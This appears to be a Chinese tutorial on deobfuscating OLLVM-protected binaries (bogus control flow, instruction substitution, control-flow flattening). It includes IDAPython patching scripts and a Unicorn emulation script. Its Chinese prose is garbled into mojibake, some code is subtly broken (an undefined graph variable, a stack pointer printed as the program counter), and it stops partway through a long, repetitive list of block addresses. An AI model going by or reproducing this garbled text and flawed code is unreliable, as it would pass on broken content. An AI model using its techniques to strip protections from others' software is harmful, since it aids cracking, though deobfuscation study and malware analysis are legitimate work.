å½“ç„¶å¦‚æœå‘ç°æœ‰ä¸€äº›æ’å®šå€¼çš„ä¸é€æ˜è°“è¯è¡¨è¾¾å¼ d810 æ²¡æœ‰è¯†åˆ«åˆ°æ— æ³•å»é™¤çš„è¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰‹åŠ¨æ·»åŠ è§„åˆ™è®© D810 è¿›è¡ŒåŒ¹é…æ¥æ¶ˆé™¤ BCF ä¾‹å¦‚å¯¹äºè¿™ä¸ªè¡¨è¾¾å¼ ((x_0&gt;=10 &amp;&amp; x_10&lt;10)==false) == True , æˆ‘ä»¬å¯ä»¥å…ˆåœ¨ \\plugins\\d810\\conf\\xxx.json é‡Œé¢æ·»åŠ æˆ‘ä»¬è‡ªå·±çš„è§„åˆ™ éšåæ¥åˆ° plugins\\d810\\optimizers\\instructions\\pattern_matching\\rewrite_and.py ä¸­åŠ ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„ç±» OaciaRule0 , è¿™æ ·å°±å¯ä»¥å®Œæˆä¸€ä¸ªè‡ªå®šä¹‰è§„åˆ™çš„å¯¼å…¥å•¦ # æ€è·¯ä¸‰ ä½¿ç”¨ idapython patch ä¸é€æ˜è°“è¯ åœ¨æ€è·¯ä¸€ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡å¯¹ä¸é€æ˜è°“è¯å˜é‡è¿›è¡Œäº¤å‰å¼•ç”¨æ‰¾åˆ°äº†å®ƒä»¬æ‰€åœ¨çš„ segment, å¹¶é€šè¿‡å°†å…¨å±€å˜é‡èµ‹å€¼å¹¶å°† segment è®¾ä¸ºåªè¯»çš„æ–¹æ³•æ¶ˆé™¤äº† BCF, ä½†æ˜¯å…¶å®æˆ‘ä»¬è¿˜å¯ä»¥ç”¨å¦å¤–çš„ä¸€ç§æ–¹å¼å»æ¶ˆé™¤ bcf, å°±æ˜¯åœ¨æ±‡ç¼–ä¸­å°†ä¸é€æ˜è°“è¯ç›´æ¥ patch æ‰ ä¾‹å¦‚å¯¹äºè¯¥ä¸é€æ˜è°“è¯ x_9 , y_10 , å®ƒçš„ c è¡¨è¾¾å¼ä¸º y_10 &gt;= 10 &amp;&amp; ((((_BYTE)x_9 - 1) * (_BYTE)x_9) &amp; 1) != 0 æˆ‘ä»¬è¦åšçš„å°±æ˜¯è®© mov eax, ds:x_9 æ”¹æˆ mov eax, 0 , è¿™æ ·å°±å¯ä»¥åšåˆ°æ¶ˆé™¤ BCF çš„ç›®çš„ ä½†æ˜¯è¿™æ ·ä¸€ä¸ªä¸€ä¸ªæ”¹è¿‡å»æ˜¾å¾—ååˆ†çš„éº»çƒ¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨ ida python, é€šè¿‡æ‰¾åˆ°ä¸é€æ˜è°“è¯çš„æ‰€æœ‰äº¤å‰å¼•ç”¨çš„æ–¹å¼æ¥æ‰¹é‡ä¿®æ”¹ # å»é™¤è™šå‡æ§åˆ¶æµ idapython è„šæœ¬import ida_xrefimport ida_idaapifrom ida_bytes import get_bytes, patch_bytes # å°† mov å¯„å­˜å™¨ï¼Œä¸é€æ˜è°“è¯ ä¿®æ”¹ä¸º mov å¯„å­˜å™¨ï¼Œ0def do_patch(ea): if get_bytes(ea, 1) == b\"\\x8B\": # mov eax-edi, dword reg = (ord(get_bytes(ea + 1, 1)) &amp; 0b00111000) >> 3 patch_bytes(ea, (0xB8 + reg).to_bytes(1,'little') + b'\\x00\\x00\\x00\\x00\\x90\\x90') else: print('error') # ä¸é€æ˜è°“è¯åœ¨.bss æ®µçš„èŒƒå›´seg = ida_segment.get_segm_by_name('.bss')start = seg.start_eaend = seg.end_ea for addr in range(start,end,4): ref = ida_xref.get_first_dref_to(addr) print(hex(addr).center(20,'-')) # è·å–æ‰€æœ‰äº¤å‰å¼•ç”¨ while(ref != ida_idaapi.BADADDR): do_patch(ref) print('patch at ' + hex(ref)) ref = ida_xref.get_next_dref_to(addr, ref) print('-' * 20)è¿™æ · BCF å°±è¢«å»æ‰å•¦ # æŒ‡ä»¤æ›¿æ¢ï¼ˆSUBï¼‰ # åŸç† æŒ‡ä»¤æ›¿æ¢ï¼ˆInstruction Substitutionï¼‰æ˜¯ä¸€ç§ä»£ç æ··æ·†æŠ€æœ¯ï¼Œç”¨äºå°†ç¨‹åºä¸­çš„åŸå§‹æŒ‡ä»¤æ›¿æ¢ä¸ºç­‰æ•ˆä½†æ›´éš¾ç†è§£å’Œè¿˜åŸçš„æŒ‡ä»¤åºåˆ—ã€‚é€šè¿‡æŒ‡ä»¤æ›¿æ¢ï¼Œå¯ä»¥å¢åŠ ç¨‹åºçš„å¤æ‚æ€§å’ŒæŠµæŠ—é€†å‘å·¥ç¨‹çš„èƒ½åŠ›ã€‚ å®ƒçš„æœ¬è´¨å…¶å®å°±æ˜¯æ•°å­¦å…¬å¼çš„ç®€åŒ–ï¼Œä¾‹å¦‚ (x + y) - 2 * (x &amp; y) -&gt; x ^ y (è¿‡å»å­¦ç¦»æ•£æ•°å­¦æ„Ÿè§‰åšçš„å°±æ˜¯è¿™ç§æ ·å­çš„â€¦) # ollvm çš„ SUB æ··æ·† ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤å¯¹ä»£ç è¿›è¡Œ SUB æ··æ·† clang -mllvm -sub -mllvm -sub_loop=3 test-sub.c -o test-subå¯ç”¨é€‰é¡¹ -mllvm -sub : æ¿€æ´»æŒ‡ä»¤æ›¿æ¢ -mllvm -sub_loop=3 : æ··æ·†æ¬¡æ•°ï¼Œè¿™é‡Œä¸€ä¸ªå‡½æ•°ä¼šè¢«æ··æ·† 3 æ¬¡ï¼Œé»˜è®¤ä¸º 1 æ¬¡ ç»è¿‡æŒ‡ä»¤æ›¿æ¢åï¼Œä»£ç æ˜æ˜¾å˜é•¿äº†å¾ˆå¤š # ollvm çš„ SUB åæ··æ·† # æ€è·¯ä¸€ ä½¿ç”¨ d810 å»é™¤ SUB D810 å¤ªçŒ›äº†ï¼è¿™é‡Œåˆç”¨åˆ°äº† D810 è¿˜æ˜¯å’Œå»é™¤ BCF åæ··æ·†ä¸€æ ·ï¼Œæˆ‘ä»¬ç›´æ¥è·‘ä¸€ä¸‹ d810, è™½ç„¶è¿˜æ˜¯æœ‰ä¸€äº›éƒ¨åˆ†æ²¡æœ‰å»æ‰ï¼Œä½†æ˜¯çœ‹èµ·æ¥å·²ç»å¾ˆæ¸…æ™°äº†ï¼Œå› ä¸ºæŒ‡ä»¤æ›¿æ¢ä¸å½±å“ç¨‹åºæ•´ä½“çš„æ‰§è¡Œé€»è¾‘ï¼Œæ‰€ä»¥æˆ‘æƒ³å‰©ä¸‹çš„ä¸€ç‚¹ç‚¹ SUB åº”è¯¥éš¾ä¸å€’é€†å‘çš„åŒå­¦å§ï½ # æ€è·¯äºŒ ä½¿ç”¨ GAMBA ç®€åŒ–å¤æ‚çš„ SUB è¡¨è¾¾å¼ è¿™ä¸ªæ€è·¯äºŒå…¶å®å°±æ˜¯æ€è·¯ä¸€é‚£ä¸€ç‚¹ç‚¹æœªè§£å†³çš„ SUB çš„è¡¥å……ï¼Œå¯¹äºä¸€äº›å¤æ‚çš„è¡¨è¾¾å¼æ¥è¯´ï¼Œgithub ä¸Šçš„å¼€æºå·¥å…· GAMBA å¯ä»¥å¾ˆå¥½çš„å¸®åŠ©æˆ‘ä»¬ç®€åŒ– å…·ä½“å¯ä»¥å‚è€ƒç»†å“ sec2023 å®‰å“èµ›é¢˜ä¸­çš„ åŠ å¯†ä¸‰ vm æŒ‡ä»¤åˆ†æ # æ§åˆ¶æµå¹³å¦åŒ–ï¼ˆFLAï¼‰ # åŸç† æ§åˆ¶æµå¹³å¦åŒ– (control flow flattening) çš„åŸºæœ¬æ€æƒ³ä¸»è¦æ˜¯é€šè¿‡ä¸€ä¸ªä¸»åˆ†å‘å™¨æ¥æ§åˆ¶ç¨‹åºåŸºæœ¬å—çš„æ‰§è¡Œæµç¨‹ï¼Œä¾‹å¦‚ä¸‹å›¾æ˜¯æ­£å¸¸çš„æ‰§è¡Œæµç¨‹ ç»è¿‡æ§åˆ¶æµå¹³å¦åŒ–åçš„æ‰§è¡Œæµç¨‹å°±å¦‚ä¸‹å›¾ è¿™æ ·å¯ä»¥æ¨¡ç³ŠåŸºæœ¬å—ä¹‹é—´çš„å‰åå…³ç³» æ­¤å›¾æ˜¯ä¸€ä¸ªç»å…¸çš„æ§åˆ¶æµå¹³å¦åŒ– CFG å…¶ä¸­ åºè¨€ï¼šå‡½æ•°çš„ç¬¬ä¸€ä¸ªæ‰§è¡Œçš„åŸºæœ¬å— ä¸» (å­) åˆ†å‘å™¨ï¼šæ§åˆ¶ç¨‹åºè·³è½¬åˆ°ä¸‹ä¸€ä¸ªå¾…æ‰§è¡Œçš„åŸºæœ¬å— retn å—ï¼šå‡½æ•°å‡ºå£ çœŸå®å—ï¼šæ··æ·†å‰çš„åŸºæœ¬å—ï¼Œç¨‹åºçœŸæ­£æ‰§è¡Œå·¥ä½œçš„å— é¢„å¤„ç†å™¨ï¼šè·³è½¬åˆ°ä¸»åˆ†å‘å™¨ # ollvm çš„ FLA æ··æ·† ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯å®Œæˆ fla æ··æ·† clang -mllvm -fla -mllvm -split -mllvm -split_num=3 test-fla.c -o test-flaå¯ç”¨é€‰é¡¹ï¼š -mllvm -fla : æ¿€æ´»æ§åˆ¶æµå¹³å¦åŒ– -mllvm -split : æ¿€æ´»åŸºæœ¬å—åˆ†å‰² -mllvm -split_num=3 : æŒ‡å®šåŸºæœ¬å—åˆ†å‰²çš„æ•°ç›® ç»è¿‡æ§åˆ¶æµå¹³å¦åŒ–ä¹‹åï¼Œå‡½æ•°çš„é€»è¾‘å·²ç»å¾ˆéš¾çœ‹æ¸…æ¥šäº† # ollvm çš„ FLA åæ··æ·† æƒ³è¦å®šä½å„ä¸ªå—å…¶å®å¾ˆç®€å•ï¼Œå¯¹äºç»å…¸çš„ ollvm æ¥è¯´ï¼Œå„ä¸ªå—ä¹‹é—´æœ‰å¦‚ä¸‹è§„åˆ™ (è¦æ˜¯é­”æ”¹çš„è¯å°±å…·ä½“æƒ…å†µå…·ä½“åˆ†æå•¦) æ‰¾åˆ°åºè¨€å—ï¼Œè¿™æ˜¯æ•´ä¸ªå‡½æ•°çš„å…¥å£ åºè¨€å—çš„åç»§æ˜¯ä¸»åˆ†å‘å™¨ ä¸»åˆ†å‘å™¨çš„å‰é©±æœ‰ä¸¤ä¸ªï¼Œé™¤äº†åºè¨€å—å¤–ï¼Œå¦ä¸€ä¸ªå—å°±æ˜¯é¢„å¤„ç†å™¨ é¢„å¤„ç†å™¨çš„å‰é©±æ˜¯çœŸå®å— é™¤æ­¤ä¹‹å¤–çš„å…¶ä»–å—æ˜¯å­åˆ†å‘å™¨ æƒ³è¦åæ§åˆ¶æµå¹³å¦åŒ–ï¼Œæˆ‘ä»¬åªéœ€è¦åš 3 æ­¥ æ‰¾åˆ°çœŸå®å—ã€‚æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨æ‰¾çœŸå®å—ï¼›å¯ä»¥ç”¨ idapython é€šè¿‡å„ä¸ªå—ä¹‹é—´çš„è”ç³»é€šè¿‡ä¸€å®šçš„è§„åˆ™æ‰¾çœŸå®å—ï¼›å¯ä»¥ç”¨ unicorn æˆ– angr å¾—åˆ°å‡½æ•°çš„ CFG, åˆ©ç”¨è§„åˆ™åŒ¹é…å‡ºçœŸå®å—â€¦ æ–¹æ³•å¤šç§å¤šæ ·ï¼Œä½†æ˜¯æ ¸å¿ƒéƒ½æ˜¯æ‰¾åˆ°çœŸå®å—ï¼Œé™¤çœŸå®å—å’Œåºè¨€å¿«å¤–ï¼Œå…¶ä½™çš„å—éƒ½æ˜¯è™šå‡å—ï¼Œæˆ‘ä»¬éœ€è¦ NOP æ‰ä»–ä»¬ å¾—åˆ°çœŸå®å—ä¹‹é—´çš„è”ç³»ã€‚æˆ‘ä»¬ä¸»è¦æƒ³çŸ¥é“åˆ†æ”¯è·³è½¬çš„å¦ä¸€ä¸ªåˆ†æ”¯ï¼Œå®ƒç©¶ç«Ÿè·³åˆ°äº†ä»€ä¹ˆåœ°æ–¹å»çš„å‘¢ï¼Ÿæ‰€ä»¥è¿™ä¸€æ­¥æˆ‘ä»¬å¿…é¡»å¾—è®©ä»£ç è¿è¡Œèµ·æ¥ï¼Œå®ƒæŠŠæ§åˆ¶æµç»™æ··æ·†äº†ï¼Œæˆ‘ä»¬è¦æ˜¯ä¸æŠŠä»£ç è·‘èµ·æ¥å’‹çŸ¥é“æ§åˆ¶æµå˜ï¼Ÿå¯ä»¥ç”¨æ¨¡æ‹Ÿæ‰§è¡Œï¼Œä¹Ÿå¯ä»¥åœ¨çœŸæœºè°ƒè¯•æ‰“æ–­ç‚¹ trace, æ ¸å¿ƒéƒ½æ˜¯ä¸ºäº†æ‰¾åˆ°çœŸå®å—ä¹‹é—´çš„è°ƒç”¨å…³ç³» å¾—åˆ°äº†çœŸå®å—ä¹‹é—´çš„è”ç³»ä¹‹åï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æ¯ä¸ªçœŸå®å—çš„æœ«å°¾ï¼Œç”¨è·³è½¬æ±‡ç¼–æŒ‡ä»¤å°†æ¯ä¸ªçœŸå®å—åƒä¸²ç³–è‘«èŠ¦ä¸€æ ·ä¸²èµ·æ¥ï¼Œæ§åˆ¶æµå¹³å¦åŒ–å°±ä¿®å¤å¥½å•¦ï½ æ‰€ä»¥å¼€å§‹æˆ‘ä»¬çš„ç¬¬ä¸€æ­¥æ‰¾åˆ°çœŸå®å—å’Œè™šå‡å—ï¼Œå¯¹äºæ ‡å‡†çš„ ollvm æ¥è¯´ï¼Œè§‚å¯Ÿå¾—çŸ¥é¢„å¤„ç†å™¨çš„å‰é©±éƒ½æ˜¯çœŸå®å—ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™å‡ºå¦‚ä¸‹çš„ idapython è„šæœ¬ import idaapiimport idctarget_func = 0x401E80#éœ€è¦åæ§åˆ¶æµå¹³å¦åŒ–çš„å‡½æ•°çš„åœ°å€Preprocessor_block = 0x402697#ollvm ä¸­é¢„å¤„ç†å™¨çš„åœ°å€ï¼Œè¿™ä¸ªæ˜¯é€šè¿‡è§‚å¯Ÿ ida ä¸­çš„ CFG å¾—åˆ°çš„ï¼Œé¢„å¤„ç†å™¨çš„å‰é©±éƒ½æ˜¯çœŸå®å—True_blocks = []#çœŸå®å—åˆ—è¡¨Fake_blocks = []#æ‰€æœ‰å—çš„åˆ—è¡¨f_block = idaapi.FlowChart(idaapi.get_func(0x401E80), flags=idaapi.FC_PREDS)for block in f_block: if block.start_ea==Preprocessor_block:#é¢„å¤„ç†å™¨å—çš„å‰é©±éƒ½æ˜¯çœŸå®å— #but é¢„å¤„ç†å™¨æ˜¯è™šå‡å— Fake_blocks.append((block.start_ea,idc.prev_head(block.end_ea))) print(\"find ture block!\") tbs = block.preds() for tb in tbs: #print (hex (tb.start_ea),hex (idc.prev_head (tb.end_ea)))# è·å–å—çš„å¼€å§‹ / ç»“æŸåœ°å€ True_blocks.append((tb.start_ea,idc.prev_head(tb.end_ea))) elif not [x for x in block.succs()]:#è¿”å›å—æ²¡æœ‰åç»§ print(\"find ret block!\") True_blocks.append((block.start_ea,idc.prev_head(block.end_ea))) # åºè¨€å—ä¸ä½œä¸ºè™šå‡å—å¤„ç† elif block.start_ea!=target_func: #print(hex(block.start_ea),hex(idc.prev_head(block.end_ea))) Fake_blocks.append((block.start_ea,idc.prev_head(block.end_ea)))print('true block:')print('tbs =',True_blocks)print('fake block:')print('fbs =',Fake_blocks)ä¹‹åå°±æ˜¯è¦å¾—åˆ°çœŸå®å—ä¹‹é—´çš„è”ç³»å•¦ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨ unicorn æ¥æ¨¡æ‹Ÿæ‰§è¡Œå¾—åˆ°çœŸå®å—çš„è°ƒç”¨å…³ç³»ï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯å› ä¸ºæˆ‘ä»¬åªå¯¹ä¸€ä¸ªå‡½æ•°ä¸­çœŸå®å—çš„å‰åè°ƒç”¨è¿›è¡Œæ¨¡æ‹Ÿæ‰§è¡Œï¼Œæ‰€ä»¥æ˜¯ä¸éœ€è¦è·³è½¬åˆ°å…¶ä»–å‡½æ•°ä¸­çš„ï¼Œé‡åˆ° call æŒ‡ä»¤ç›´æ¥å°† pc å¼ºåˆ¶æ”¹æˆä¸‹ä¸€è¡Œæ±‡ç¼–çš„åœ°å€ï¼ŒåŒæ—¶ä¹Ÿè¦æ³¨æ„å†…å­˜è®¿é—®å¼‚å¸¸çš„æƒ…å†µç›´æ¥é€šè¿‡ uc.hook_add(UC_HOOK_MEM_UNMAPPED|UC_HOOK_INTR, hook_mem_access) è¿›è¡Œå¿½ç•¥ é€šè¿‡è¿™ä¸ª unicorn è„šæœ¬æ¨¡æ‹Ÿæ‰§è¡Œï¼Œæˆ‘ä»¬å¾—åˆ°äº†åˆ†æ”¯è·³è½¬æ—¶ä¸‹ä¸€ä¸ªè¦è·³è½¬çš„çœŸå®å—åœ°å€ï¼Œä»¥åŠæ­¤æ—¶çš„ ZF æ ‡å¿—ä½ï¼Œè¿™ä¸ªæ ‡å¿—ä½å¯æ˜¯æœ‰ç€å¤§ç”¨ï¼Œé€šè¿‡è¿™ä¸ªæ ‡å¿—ä½æˆ‘ä»¬å°±å¯ä»¥çŸ¥é“ç©¶ç«Ÿæ˜¯ jz è·³è½¬è¿˜æ˜¯ jnz è·³è½¬å•¦ # code for test-fla.elffrom unicorn import *from unicorn.x86_const import *from keystone import * # pip install keystone-enginefrom capstone import * # pip install capstone# import networkx as nx #pip install networkx# import matplotlib.pyplot as plt # pip install matplotlibBASE = 0x400000CODE = BASE + 0x0CODE_SIZE = 0x100000STACK = 0x7F00000000STACK_SIZE = 0x100000FS = 0x7FF0000000FS_SIZE = 0x100000ks = Ks(KS_ARCH_X86, KS_MODE_64) # æ±‡ç¼–å¼•æ“uc = Uc(UC_ARCH_X86, UC_MODE_64) # æ¨¡æ‹Ÿæ‰§è¡Œå¼•æ“cs = Cs(CS_ARCH_X86, CS_MODE_64) # åæ±‡ç¼–å¼•æ“# g=nx.Graph ()# åˆ›å»ºç©ºçš„æ— å‘å›¾# g=nx.DiGraph ()# åˆ›å»ºç©ºçš„æœ‰å‘å›¾tbs = [(4204176, 4204182), (4203066, 4203066), (4203071, 4203098), (4203103, 4203157), (4203162, 4203314), (4203319, 4203341), (4203346, 4203366), (4203371, 4203398), (4203403, 4203428), (4203433, 4203457), (4203462, 4203490), (4203495, 4203514), (4203519, 4203558), (4203563, 4203585), (4203590, 4203609), (4203614, 4203636), (4203641, 4203651), (4203656, 4203689), (4203694, 4203737), (4203742, 4203776), (4203781, 4203804), (4203809, 4203831), (4203836, 4203856), (4203861, 4203888), (4203893, 4203918), (4203923, 4203957), (4203962, 4203981), (4203986, 4204025), (4204030, 4204040), (4204045, 4204067), (4204072, 4204091), (4204096, 4204118), (4204123, 4204133), (4204138, 4204171)]tb_call = []main_addr = 0x00000000000401E80main_end = 0x0000000000040269Cdef hook_code(uc: unicorn.Uc, address, size, user_data): # print(hex(address)) for i in cs.disasm(CODE_DATA[address - BASE:address - BASE + size], address): if i.mnemonic == \"call\": # å› ä¸ºåªæ˜¯é’ˆå¯¹å•ä¸ªå‡½æ•°çš„æ§åˆ¶æµï¼Œæ‰€ä»¥æˆ‘ä»¬å¹¶ä¸éœ€è¦è·³è½¬åˆ°å…¶ä»–çš„å‡½æ•°é‡Œé¢ print(f\"find call at &#123;hex(address)&#125;, jump...\") uc.reg_write(UC_X86_REG_RIP, address + size) elif i.mnemonic == \"ret\": print(\"find ret block, emu stop~\") uc.emu_stop() print(\"block emu pathâ†“â†“â†“â†“\") print(tb_call) # for i in range(len(tb_call)-1): # g.add_edge(tb_call[i],tb_call[i+1]) # Plot it # nx.draw(g, with_labels=True) # nx.write_gml(g,'./test-fla.gml') for tb in tbs: if address == tb[1]: # print (uc.reg_read (UC_X86_REG_FLAGS))#ZF æ ‡å¿—ä½åœ¨ç¬¬ 6 ä½ ZF_flag = (uc.reg_read(UC_X86_REG_FLAGS) &amp; 0b1000000) >> 6 #print(\"ZF=\", ZF_flag) tb_call.append((tb, ZF_flag)) breakdef hook_mem_access(uc: unicorn.Uc, type, address, size, value, userdata): pc = uc.reg_read(UC_X86_REG_RSP) # UC_ARM64_REG_PC print('pc:%x type:%d addr:%x size:%x' % (pc, type, address, size)) # uc.emu_stop() return Truedef inituc(uc): uc.mem_map(CODE, CODE_SIZE, UC_PROT_ALL) uc.mem_map(STACK, STACK_SIZE, UC_PROT_ALL) uc.mem_write(CODE, CODE_DATA) uc.reg_write(UC_X86_REG_RSP, STACK + 0x1000) uc.hook_add(UC_HOOK_CODE, hook_code) uc.hook_add(UC_HOOK_MEM_UNMAPPED | UC_HOOK_INTR, hook_mem_access)def init_graph(): for tb in tbs: g.add_node(tb[1])with open('./test-fla', 'rb') as f: CODE_DATA = f.read()inituc(uc)try: uc.emu_start(main_addr, main_end)except Exception as e: print(e)ä¹‹åå†å»å†™ä¸€ä¸ª idapython è„šæœ¬å°†çœŸå®å—ä¸²èµ·æ¥å°±å¯ä»¥å•¦ï¼Œæˆ‘ä»¬è§‚å¯Ÿæ ‡å‡†çš„ ollvm æ··æ·†åçš„æ–‡ä»¶åå‘ç°ï¼Œå…¶å®çœŸå®å—æ‰€å¤„çš„ä½ç½®æ˜¯è¿ç»­çš„ï¼Œæ¯”å¦‚æœ‰è¿™ä¸¤ä¸ªçœŸå®å—ï¼Œè™½ç„¶ä»–ä»¬è·³è½¬çš„åœ°å€éƒ½æ˜¯ loc_402697 é¢„å¤„ç†å™¨çš„ä½ç½®ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªçœŸå®å—æ²¡æœ‰åˆ†æ”¯è·³è½¬ï¼Œæ‰€ä»¥è¯´æˆ‘ä»¬åªéœ€è¦å°† jmp loc_402697 nop æ‰ï¼Œå°±å®Œæˆäº†æ— åˆ†æ”¯è·³è½¬çœŸå®å—çš„ä¸²è”ï¼Œè€Œéº»çƒ¦çš„åªæ˜¯åˆ†æ”¯è·³è½¬ï¼Œæˆ‘ä»¬ç”±æ¨¡æ‹Ÿæ‰§è¡Œåå·²ç»å¾—åˆ°äº†åˆ†æ”¯è·³è½¬æ—¶çš„ ZF æ ‡å¿—ä½ï¼Œé€šè¿‡è¯¥æ ‡å¿—ä½æˆ‘ä»¬å°†å°† jmp æ”¹æˆä¸ºé›¶è·³è½¬ (jz) äº¦æˆ–æ˜¯éé›¶è·³è½¬ (jnz) å†™ä¸€ä¸‹ patch è„šæœ¬ï¼Œä¿®å¤æˆåŠŸï½ import idaapiimport ida_bytesimport idcfrom keystone import *ks = Ks(KS_ARCH_X86, KS_MODE_64) # æ±‡ç¼–å¼•æ“def jmp_patch(start, target, j_code=\"jmp\"): global debug patch_byte, count = ks.asm(f\"&#123;j_code&#125; &#123;hex(target)&#125;\", addr=start) patch_byte = bytes(patch_byte) + b'\\x00' * (idc.get_item_size(start) - len(patch_byte)) print(hex(start), f\"&#123;j_code&#125; &#123;hex(target)&#125;\", patch_byte) ida_bytes.patch_bytes(start, patch_byte)def patch_nop(addr, endaddr): #print(f\"Patching from &#123;addr&#125; to &#123;endaddr&#125;\") while addr &lt; endaddr: ida_bytes.patch_byte(addr, 0x90) addr += 1def patch_nop_line(addr): patch_nop(addr,addr+idc.get_item_size(addr))preamble_block = 0x401E8B # åºè¨€å—çš„åœ°å€internal_reg = '[rbp+var_B4]'#ä¸­é—´å˜é‡çš„åç§°ï¼Œé‡åˆ°è¿™ä¸ªæƒ³éƒ½ä¸ç”¨æƒ³ç›´æ¥ NOP# æ ¼å¼: ((å—çš„èµ·å§‹åœ°å€ï¼Œå—çš„ç»“æŸåœ°å€),ZF æ ‡å¿—ä½)tb_path = [((4203071, 4203098), 0), ((4203103, 4203157), 0), ((4203162, 4203314), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 